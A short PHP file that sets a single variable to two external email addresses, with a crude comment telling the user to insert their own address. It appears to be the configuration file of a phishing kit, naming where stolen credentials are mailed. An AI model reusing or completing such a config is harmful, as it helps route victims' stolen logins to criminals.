<?php

$email = "surelogzzz@yandex.com, docs72171@protonmail.com"; // PUT UR FUCKING E-MAIL BRO

?>